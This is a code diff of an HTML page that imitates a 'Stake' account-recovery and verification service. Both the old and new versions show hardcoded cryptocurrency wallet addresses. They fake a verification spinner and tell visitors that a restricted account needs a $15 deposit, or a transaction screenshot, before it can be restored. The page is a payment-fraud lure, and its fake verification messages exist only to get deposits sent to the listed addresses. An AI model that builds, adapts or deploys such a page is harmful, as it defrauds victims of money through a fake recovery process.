@@ -1,181 +1,124 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>ReStakeAccess - Account Recovery</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: linear-gradient(to bottom right, #0f0c29, #302b63, #24243e);
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .box {
-      background: rgba(255, 255, 255, 0.05);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      padding: 20px;
-      border-radius: 10px;
-      text-align: center;
-      width: 90%;
-      max-width: 420px;
-    }
-    input, select {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border-radius: 5px;
-      border: none;
-    }
-    .btn {
-      background: #00f7ff;
-      padding: 10px;
-      color: black;
-      font-weight: bold;
-      border-radius: 5px;
-      margin-top: 10px;
-      cursor: pointer;
-    }
-    .address-box {
-      background: #111;
-      padding: 10px;
-      border-radius: 5px;
-      word-break: break-all;
-      margin-top: 10px;
-      color: #00ffcc;
-      position: relative;
-    }
-    .copy-btn {
-      position: absolute;
-      right: 10px;
-      top: 10px;
-      background: #00f7ff;
-      color: black;
-      border: none;
-      border-radius: 5px;
-      padding: 5px;
-      cursor: pointer;
-    }
-    .verify-animation {
-      margin-top: -5px;
-      font-size: 12px;
-      color: #00ffcc;
-      animation: blink 1s infinite;
-    }
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.2; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ReStake Access</title>
+    <style>
+        /* Simple style for the page */
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+        }
+
+        /* Style for the button */
+        #verifyBtn {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        /* Loading animation */
+        #loadingAnimation {
+            display: none;
+            margin-top: 20px;
+        }
+
+        /* Message Style */
+        #verificationMessage {
+            margin-top: 20px;
+            font-size: 18px;
+            color: green;
+        }
+
+        /* Spinner animation */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 2s linear infinite;
+        }
+
+        /* Dropdown for selecting crypto addresses */
+        select, option {
+            padding: 10px;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+    </style>
 </head>
 <body>
-  <div class="box">
-    <h2>Account Recovery</h2>
-    <input type="text" id="username" placeholder="Enter username" oninput="checkSubmit()" />
-    <div class="verify-animation">🔄 Verifying username...</div>
 
-    <label for="coin">Select Coin:</label>
-    <select id="coin" onchange="updateNetworkOptions(); checkSubmit()">
-      <option value="">-- Select Coin --</option>
-      <option value="USDT">USDT</option>
-      <option value="BTC">BTC</option>
-      <option value="TRX">TRX</option>
-      <option value="Ethereum">Ethereum</option>
+    <!-- Username Input and Verify Button -->
+    <input type="text" id="username" placeholder="Enter your username" style="padding: 10px; font-size: 16px;">
+    
+    <!-- Dropdown for selecting cryptocurrency -->
+    <select id="cryptoSelect">
+        <option value="USDT_TRC20">USDT - TRC20</option>
+        <option value="USDT_BSC">USDT - BSC</option>
+        <option value="BTC_BSC">BTC - BSC</option>
+        <option value="TRX_TRC20">TRX - TRC20</option>
+        <option value="TRX_BSC">TRX - BSC</option>
+        <option value="ETH_BSC">Ethereum - BSC</option>
     </select>
 
-    <label for="network">Select Network:</label>
-    <select id="network" onchange="showAddress(); checkSubmit()">
-      <option value="">-- Select Network --</option>
-    </select>
+    <button id="verifyBtn" onclick="verifyAccount()">Verify</button>
 
-    <div id="address" class="address-box" style="display: none;">
-      <span id="wallet-address"></span>
-      <button class="copy-btn" onclick="copyAddress()">Copy</button>
+    <!-- Loading Animation -->
+    <div id="loadingAnimation">
+        <p>Verifying...</p>
+        <div class="loader"></div>
     </div>
 
-    <label for="screenshot">Upload Transaction Screenshot:</label>
-    <input type="file" id="screenshot" accept="image/*" onchange="checkSubmit()" />
+    <!-- Verification Message -->
+    <div id="verificationMessage"></div>
 
-    <button class="btn" id="submitBtn" onclick="submitForm()" disabled>Submit</button>
-    <p id="status"></p>
-  </div>
+    <script>
+        // Crypto Addresses and Networks
+        const cryptoAddresses = {
+            "USDT_TRC20": "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
+            "USDT_BSC": "0x4d31c46627c343939e7a02383c2451048a509a0c",
+            "BTC_BSC": "0x4d31c46627c343939e7a02383c2451048a509a0c",
+            "TRX_TRC20": "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
+            "TRX_BSC": "0x4d31c46627c343939e7a02383c2451048a509a0c",
+            "ETH_BSC": "0x4d31c46627c343939e7a02383c2451048a509a0c"
+        };
 
-  <script>
-    const addressMap = {
-      USDT: {
-        TRC20: "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
-        BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
-      },
-      BTC: {
-        BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
-      },
-      TRX: {
-        TRC20: "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
-        BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
-      },
-      Ethereum: {
-        BSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
-      }
-    };
+        // Function to verify account
+        function verifyAccount() {
+            const username = document.getElementById("username").value;
+            const selectedCrypto = document.getElementById("cryptoSelect").value;
+            const address = cryptoAddresses[selectedCrypto];
 
-    function updateNetworkOptions() {
-      const coin = document.getElementById("coin").value;
-      const networkSelect = document.getElementById("network");
-      const addressDiv = document.getElementById("address");
-      networkSelect.innerHTML = '<option value="">-- Select Network --</option>';
-      addressDiv.style.display = 'none';
-      if (coin && addressMap[coin]) {
-        const networks = Object.keys(addressMap[coin]);
-        networks.forEach(network => {
-          const option = document.createElement("option");
-          option.value = network;
-          option.text = network;
-          networkSelect.appendChild(option);
-        });
-      }
-    }
+            // Show loading animation
+            document.getElementById("loadingAnimation").style.display = "block";
+            document.getElementById("verifyBtn").disabled = true;
 
-    function showAddress() {
-      const coin = document.getElementById("coin").value;
-      const network = document.getElementById("network").value;
-      const addressBox = document.getElementById("address");
-      const addressSpan = document.getElementById("wallet-address");
-      if (coin && network && addressMap[coin][network]) {
-        addressSpan.innerText = addressMap[coin][network];
-        addressBox.style.display = "block";
-      } else {
-        addressBox.style.display = "none";
-      }
-    }
+            // Simulate a delay of 1-2 seconds for verification
+            setTimeout(function() {
+                document.getElementById("loadingAnimation").style.display = "none"; // Hide loading animation
+                displayVerificationMessage(username, address, selectedCrypto); // Show verification message
+            }, 2000); // 2 seconds delay
+        }
 
-    function copyAddress() {
-      const address = document.getElementById("wallet-address").innerText;
-      navigator.clipboard.writeText(address).then(() => {
-        alert("Address copied to clipboard!");
-      });
-    }
+        // Display the verification message
+        function displayVerificationMessage(username, address, selectedCrypto) {
+            document.getElementById("verificationMessage").innerHTML = `
+                <strong>Account for Username:</strong> ${username} <br>
+                <strong>Selected Address:</strong> ${address} <br>
+                <strong>Network:</strong> ${selectedCrypto.split('_')[1]} <br><br>
+                Your Stake account is in withdraw-only mode or has restrictions. To resolve this, a minimum deposit of $15 is required. The deposited amount will be added to your Stake account automatically.
+            `;
+        }
+    </script>
 
-    function checkSubmit() {
-      const username = document.getElementById("username").value.trim();
-      const coin = document.getElementById("coin").value;
-      const network = document.getElementById("network").value;
-      const screenshot = document.getElementById("screenshot").files.length > 0;
-      document.getElementById("submitBtn").disabled = !(username && coin && network && screenshot);
-    }
-
-    function submitForm() {
-      const status = document.getElementById("status");
-      status.innerHTML = "Submitting...";
-      status.style.color = "white";
-      setTimeout(() => {
-        status.innerHTML = "✅ This account recovery request has been received by Stake Pass. Your Stake account will be fully active within 24 - 72 hours.";
-        status.style.color = "#00ff99";
-      }, 1500);
-    }
-  </script>
 </body>
 </html>
